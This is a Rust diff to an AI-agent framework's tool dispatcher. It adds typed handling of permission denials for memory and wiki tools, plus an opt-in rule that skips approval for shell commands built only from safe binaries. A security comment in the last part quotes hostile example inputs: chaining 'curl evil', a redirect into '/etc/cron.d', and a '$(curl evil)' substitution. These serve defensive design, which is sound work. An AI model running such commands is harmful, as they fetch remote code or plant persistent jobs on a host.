@@ -118,6 +118,29 @@ pub struct ToolExecContext<'a> {
 // and the destructured `media_engine`, `media_drivers`, `browser_ctx`,
 // `tts_engine`, `docker_config` bindings have no consumer. Re-flagging
 // them per-feature would be 5 nested `cfg_attr` blocks; this is cleaner.
+/// Build a [`ToolResult`] from a `ToolError`-native tool's result, mapping the
+/// error through [`ToolError::execution_status`] so an ACL `PermissionDenied`
+/// carries `ToolExecutionStatus::Denied` (a *soft* error — reported to the
+/// model but not counted toward the consecutive-hard-failure abort) instead of
+/// the default hard `Error` status the stringly boundary produces. (#5984)
+fn tool_result_from_typed(tool_use_id: &str, result: TypedToolResult) -> ToolResult {
+    match result {
+        Ok(content) => ToolResult {
+            tool_use_id: tool_use_id.to_string(),
+            content,
+            is_error: false,
+            ..Default::default()
+        },
+        Err(e) => ToolResult {
+            tool_use_id: tool_use_id.to_string(),
+            content: format!("Error: {e}"),
+            status: e.execution_status(),
+            is_error: true,
+            ..Default::default()
+        },
+    }
+}
+
 #[allow(unused_variables)]
 pub async fn execute_tool_raw(
     tool_use_id: &str,
@@ -185,6 +208,50 @@ pub async fn execute_tool_raw(
         interrupt,
         dangerous_command_checker,
     } = ctx;
+
+    // ACL-gated, `ToolError`-native tools (memory_* + wiki_*) are dispatched
+    // here, before the stringly `match` below, through the typed boundary —
+    // so a per-user `PermissionDenied` (from the shared `enforce_memory_acl`
+    // gate, #5139) carries `ToolExecutionStatus::Denied` (soft: reported to
+    // the model but not counted toward the consecutive-hard-failure abort)
+    // instead of being flattened to a hard string error that death-spirals the
+    // turn on a permanent, non-fatal denial. (#5984)
+    let acl_gated: Option<TypedToolResult> = match tool_name {
+        "memory_store" => Some(tool_memory_store(
+            input,
+            *kernel,
+            *caller_agent_id,
+            *sender_id,
+            *channel,
+        )),
+        "memory_recall" => Some(tool_memory_recall(
+            input,
+            *kernel,
+            *caller_agent_id,
+            *sender_id,
+            *channel,
+        )),
+        "memory_list" => Some(tool_memory_list(
+            input,
+            *kernel,
+            *caller_agent_id,
+            *sender_id,
+            *channel,
+        )),
+        "wiki_get" => Some(tool_wiki_get(input, *kernel, *sender_id, *channel)),
+        "wiki_search" => Some(tool_wiki_search(input, *kernel, *sender_id, *channel)),
+        "wiki_write" => Some(tool_wiki_write(
+            input,
+            *kernel,
+            *caller_agent_id,
+            *sender_id,
+            *channel,
+        )),
+        _ => None,
+    };
+    if let Some(typed) = acl_gated {
+        return tool_result_from_typed(tool_use_id, typed);
+    }
 
     let result = match tool_name {
         // Filesystem tools
@@ -584,9 +651,13 @@ pub async fn execute_tool_raw(
                 let (threshold, max_artifact) =
                     resolve_spill_config(*spill_threshold_bytes, *max_artifact_bytes);
                 if let Some(ctx) = web_ctx {
-                    ctx.search.search(query, max_results).await.map(|body| {
-                        spill_or_passthrough("web_search", body, threshold, max_artifact)
-                    })
+                    ctx.search
+                        .search(query, max_results)
+                        .await
+                        .map(|body| {
+                            spill_or_passthrough("web_search", body, threshold, max_artifact)
+                        })
+                        .map_err(|e| e.to_string())
                 } else {
                     // #3576: tool returns Result<String, ToolError>; narrow here.
                     tool_web_search_legacy(input)
@@ -897,26 +968,9 @@ pub async fn execute_tool_raw(
         "agent_list" => tool_agent_list(*kernel).map_err(|e| e.to_string()),
         "agent_kill" => tool_agent_kill(input, *kernel).map_err(|e| e.to_string()),
 
-        // Shared memory tools (peer-scoped when sender_id is present).
-        // #5139: the per-user `UserMemoryAccess` ACL is enforced inside each
-        // tool fn (`enforce_memory_acl`) using the attributed sender +
-        // channel, mirroring the proactive-retrieval gate.
-        "memory_store" => tool_memory_store(input, *kernel, *caller_agent_id, *sender_id, *channel),
-        "memory_recall" => {
-            tool_memory_recall(input, *kernel, *caller_agent_id, *sender_id, *channel)
-        }
-        "memory_list" => tool_memory_list(input, *kernel, *caller_agent_id, *sender_id, *channel),
-
-        // Memory wiki tools (issue #3329) — same #5139 per-user ACL gate.
-        // #3576: submodule returns Result<String, ToolError>; narrow here.
-        "wiki_get" => {
-            tool_wiki_get(input, *kernel, *sender_id, *channel).map_err(|e| e.to_string())
-        }
-        "wiki_search" => {
-            tool_wiki_search(input, *kernel, *sender_id, *channel).map_err(|e| e.to_string())
-        }
-        "wiki_write" => tool_wiki_write(input, *kernel, *caller_agent_id, *sender_id, *channel)
-            .map_err(|e| e.to_string()),
+        // Shared memory (`memory_*`) and wiki (`wiki_*`) tools are dispatched
+        // before this match, through the typed `ToolError` boundary, so their
+        // per-user ACL denials carry the soft `Denied` status (#5139 / #5984).
 
         // Collaboration tools. task_* is the #3576 third slice: the submodule
         // returns `Result<String, ToolError>`; arms narrow to
@@ -1567,6 +1621,30 @@ pub async fn execute_tool(
     let shell_exec_full_mode = tool_name == "shell_exec"
         && exec_policy.is_some_and(|p| p.mode == librefang_types::config::ExecSecurityMode::Full);
 
+    // #5962: opt-in — in allowlist mode, a shell_exec whose EVERY base command is a
+    // declared safe_bin may skip the approval prompt. Off by default.
+    //
+    // The skip is a STRICT SUBSET of the execution-time allowlist gate, by design:
+    //   1. every base extracted by `extract_all_commands` ∈ `safe_bins` — keeps the
+    //      intent narrow (operator `allowed_commands` still require approval; only
+    //      stdin-only safe_bins may skip), and rejects chains with a non-safe base
+    //      (`env; curl evil`); and
+    //   2. the command must additionally pass `validate_command_allowlist` itself —
+    //      the same metacharacter + shell-wrapper checks the gate runs at execution.
+    // Clause 2 is load-bearing: without it a single-segment command with a redirect or substitution (`env > /etc/cron.d/x`, `env $(curl evil)`) has one safe base and would skip the prompt only to be blocked later — so the skip must not be looser than the gate it fronts.
+    // Gating on `is_ok()` makes "approval skipped" ⊆ "would actually execute", independent of check ordering.
+    let shell_exec_all_safe_bins = tool_name == "shell_exec"
+        && exec_policy.is_some_and(|p| {
+            p.safe_bins_skip_approval
+                && p.mode == librefang_types::config::ExecSecurityMode::Allowlist
+                && input["command"].as_str().is_some_and(|cmd| {
+                    let bases = crate::subprocess_sandbox::extract_all_commands(cmd);
+                    !bases.is_empty()
+                        && bases.iter().all(|b| p.safe_bins.iter().any(|sb| sb == b))
+                        && crate::subprocess_sandbox::validate_command_allowlist(cmd, p).is_ok()
+                })
+        });
+
     // Parse the session id once. Invalid UUIDs (legacy non-uuid session
     // ids, channel-derived synthetic ids) leave this `None` so the ACP
     // routing in `file_read` / `file_write` falls through to the
@@ -1622,12 +1700,14 @@ pub async fn execute_tool(
             }
         };
 
-        // SECURITY: the shell-Full bypass only applies to the global
-        // `require_approval` list — a user-policy `NeedsApproval` MUST
-        // still route through the approval queue. Without `!force_approval`
-        // here, a user whose RBAC policy demanded approval would have the
-        // call execute directly under Full mode, defeating Phase-2.
-        let skip_approval_for_full_exec = shell_exec_full_mode && !force_approval;
+        // SECURITY: the shell-Full bypass (and the #5962 opt-in all-safe-bins
+        // bypass) only applies to the global `require_approval` list — a
+        // user-policy `NeedsApproval` MUST still route through the approval
+        // queue. Without `!force_approval` here, a user whose RBAC policy
+        // demanded approval would have the call execute directly, defeating
+        // Phase-2.
+        let skip_approval_for_full_exec =
+            (shell_exec_full_mode || shell_exec_all_safe_bins) && !force_approval;
 
         if !skip_approval_for_full_exec
             && (force_approval || kh.requires_approval_with_context(tool_name, sender_id, channel))
